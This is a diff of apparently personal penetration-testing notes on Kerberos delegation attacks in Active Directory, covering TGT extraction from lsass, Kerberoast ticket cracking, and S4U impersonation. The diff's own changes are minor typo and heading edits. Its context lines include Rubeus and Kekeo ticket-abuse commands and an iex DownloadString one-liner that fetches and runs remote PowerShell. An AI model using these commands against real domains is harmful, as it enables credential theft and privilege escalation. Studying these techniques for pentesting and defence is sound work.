@@ -634,7 +634,7 @@ python.exe .\tgsrepcrack.py .\10k-passwords.txt '.\2-
 # Kerberos Delegation
 A Service which requires authentication from the user to access a subsequent service (e.g., a user accessing a SQL database via an HTTP service). In this case delegation is required and the first service (HTTP) will impersonate the user to authenticate to the second service (SQL). This is achieved by enclosing the users TGT within the TGS which is encrypted with the hash of the service account.
 
-Basically this means if we have compromised a service account/machine and a Domain Admin connects, we are able to obtain their TGT as it is embedded inside the Delegated TSG Ticket. 
+Basically this means if we have compromised a service account/machine and a Domain Admin connects, we are able to obtain their TGT as it is embedded inside the Delegated TGS Ticket. 
 
 Once the delegated TGS is received by the service machine/account with Delegation enabled, the enclosed user TGT is extracted and stored in the machine’s lsass process. This means if we have localadmin on the service machine, we can obtain this TGT by dumping creds.
 
@@ -700,6 +700,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 # Constrained Delegation
 This is when a TGT can be forwarded only to a specified Service defined in the specific User/Machine/Resource msds-allowedtodelegateto property.
+
 It also introduces s4u - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos.
 
 ```Get-DomainUser –TrustedToAuth```
@@ -730,7 +731,7 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 ```
 * * * 
 
-#### SFU - constrained delegation user 
+#### Rubeus SFU - constrained delegation user 
 
 Rubeus (can put ```/ptt``` to inject ticket directly, or save for later):
 ```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}```
@@ -745,7 +746,7 @@ https://github.com/GhostPack/Rubeus#tgtdeleg
 
 ```klist```
 
-#### SFU - constrained delegation machine
+#### Rubeus SFU - constrained delegation machine
 
 We could also just do it all in one command 
 
